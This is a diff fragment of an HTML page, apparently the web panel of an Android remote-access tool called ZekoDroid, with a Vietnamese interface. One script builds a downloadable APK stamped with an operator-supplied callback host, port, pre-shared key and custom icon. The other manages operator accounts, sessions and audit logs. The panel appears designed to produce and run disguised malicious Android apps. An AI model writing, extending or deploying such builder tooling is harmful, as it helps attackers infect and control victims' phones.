+    } catch (e) {}
+  }
+
+  document.querySelector('#bBuild').onclick = async () => {
+    const host = document.querySelector('#bHost').value.trim();
+    const port = parseInt(document.querySelector('#bPort').value || '7878');
+    const psk = document.querySelector('#bPsk').value.trim();
+    const out = document.querySelector('#bOut');
+    if (!host) { out.textContent = 'nhập host đã'; return; }
+
+    let icon = null;
+    const f = document.querySelector('#bIcon').files[0];
+    if (f) {
+      icon = await new Promise(res => {
+        const fr = new FileReader();
+        fr.onload = () => res(String(fr.result).split(',')[1]);
+        fr.readAsDataURL(f);
+      });
+    }
+
+    out.textContent = 'đang build…';
+    const t0 = Date.now();
+    try {
+      const r = await fetch('/api/builder/build', {
+        method: 'POST', credentials: 'same-origin',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ host, port, psk, icon })
+      });
+      if (!r.ok) {
+        const j = await r.json().catch(() => ({}));
+        out.textContent = 'lỗi: ' + (j.error || r.status);
+        return;
+      }
+      const blob = await r.blob();
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `ZekoDroid-${host.replace(/\./g, '_')}.apk`;
+      a.click();
+      URL.revokeObjectURL(url);
+      out.textContent = `OK · ${(blob.size / 1024).toFixed(1)} KB · ${Date.now() - t0} ms\n` +
+        `host=${host} port=${port} psk=${psk ? 'có' : 'không'}${icon ? ' + icon riêng' : ''}`;
+    } catch (e) {
+      out.textContent = 'lỗi: ' + e.message;
+    }
+  };
+})();
+</script>
+<script>
+/* zk-admin */
+(function () {
+  const wrap = document.querySelector('#adminWrap');
+  const body = document.querySelector('#admBody');
+  let tab = 'users', perms = [];
+
+  window.__zkRefreshMe = async () => {
+    try {
+      const me = await api('/api/me');
+      if (!me || !me.ok) return;
+      perms = me.perms || [];
+      const canAdmin = perms.includes('*') || perms.includes('users.manage') || perms.includes('logs.view');
+      document.querySelector('#openAdmin').style.display = canAdmin ? '' : 'none';
+      if (!perms.includes('*') && !perms.includes('users.manage'))
+        [...document.querySelectorAll('[data-adm="users"],[data-adm="sessions"]')].forEach(e => e.style.display = 'none');
+      if (!perms.includes('*') && !perms.includes('builder.use'))
+        document.querySelector('#openBuilder').style.display = 'none';
+      const who = document.querySelector('#who');
+      if (who && me.user) who.textContent = me.user + ' · ' + me.role;
+    } catch (e) { }
+  };
+  window.addEventListener('load', () => window.__zkRefreshMe());
+
+  document.querySelector('#openAdmin').onclick = () => {
+    document.querySelector('#main').style.display = 'none';
+    document.querySelector('#loginBox').style.display = 'none';
+    document.querySelector('#builderWrap').style.display = 'none';
+    wrap.style.display = '';
+    draw();
+  };
+  document.querySelector('#aClose').onclick = () => { wrap.style.display = 'none'; document.querySelector('#main').style.display = ''; };
+  document.querySelectorAll('[data-adm]').forEach(t => t.onclick = () => {
+    tab = t.dataset.adm;
+    document.querySelectorAll('[data-adm]').forEach(x => x.classList.toggle('active', x === t));
+    draw();
+  });
+
+  async function draw() {
+    if (tab === 'users') return drawUsers();
+    if (tab === 'sessions') return drawSessions();
+    return drawLogs();
+  }
+
+  async function drawUsers() {
+    const rows = await api('/api/users');
+    body.innerHTML = `
+      <div class="flex" style="margin-bottom:10px;flex-wrap:wrap">
+        <input id="uName" placeholder="username" style="max-width:170px">
+        <input id="uPass" placeholder="password" style="max-width:170px">
+        <select id="uRole" style="max-width:150px"><option>viewer</option><option>operator</option><option>admin</option></select>
+        <button class="primary" id="uAdd">+ Tạo user</button>
+        <div class="grow"></div><span class="dim" id="uMsg"></span>
+      </div>
+      <table><thead><tr><th>ID</th><th>User</th><th>Role</th><th>Tạo lúc</th><th></th></tr></thead>
+        <tbody>${(Array.isArray(rows) ? rows : []).map(u => `
+          <tr><td class="dim">${u.id}</td><td><b>${esc(u.name)}</b></td><td class="dim">${esc(u.role)}</td>
+          <td class="dim">${esc(u.created)}</td>
+          <td>${u.role === 'admin' ? '' : `<button class="danger" data-del="${u.id}">xoá</button>`}</td></tr>`).join('')}
+        </tbody></table>`;
+    document.querySelector('#uAdd').onclick = async () => {
+      const r = await post('/api/users', {
+        name: document.querySelector('#uName').value.trim(),
+        pass: document.querySelector('#uPass').value,
+        role: document.querySelector('#uRole').value
+      });
+      document.querySelector('#uMsg').textContent = r.ok ? 'đã tạo' : (r.error || 'lỗi');
+      if (r.ok) drawUsers();
+    };
+    body.querySelectorAll('[data-del]').forEach(b => b.onclick = async () => {
+      if (!confirm('Xoá user #' + b.dataset.del + '?')) return;
+      await api('/api/users/' + b.dataset.del, { method: 'DELETE' });
+      drawUsers();
+    });
+  }
+
+  async function drawSessions() {
+    const rows = await api('/api/sessions');
+    body.innerHTML = `<table><thead><tr><th>User</th><th>Role</th><th>IP</th><th>Đăng nhập</th>
+      <th>Hoạt động</th><th></th></tr></thead><tbody>
+      ${(Array.isArray(rows) ? rows : []).map(s => `
+        <tr><td><b>${esc(s.name)}</b></td><td class="dim">${esc(s.role)}</td><td class="dim">${esc(s.ip)}</td>
+        <td class="dim">${esc(s.created)}</td><td class="dim">${esc(s.lastSeen)}</td>
+        <td>${s.revoked ? '<span class="dim">đã thu hồi</span>' :
+          `<button class="danger" data-rev="${esc(s.tokenFull)}">thu hồi</button>`}</td></tr>`).join('')}
+      </tbody></table>`;
+    body.querySelectorAll('[data-rev]').forEach(b => b.onclick = async () => {
+      await post('/api/sessions/revoke', { token: b.dataset.rev });
+      drawSessions();
+    });
+  }
+
+  async function drawLogs() {
+    const rows = await api('/api/logs?limit=300');
+    body.innerHTML = `<div class="scrolly"><table><thead><tr><th>Lúc</th><th>User</th><th>IP</th>
+      <th>Hành động</th><th>Chi tiết</th></tr></thead><tbody>
+      ${(Array.isArray(rows) ? rows : []).map(l => `
+        <tr><td class="dim">${esc(l.ts)}</td><td>${esc(l.user)}</td><td class="dim">${esc(l.ip)}</td>
+        <td><span class="pill">${esc(l.action)}</span></td><td class="dim">${esc(l.detail)}</td></tr>`).join('')}
+      </tbody></table></div>`;
+  }
+})();
+</script>
+</body>
+</html>
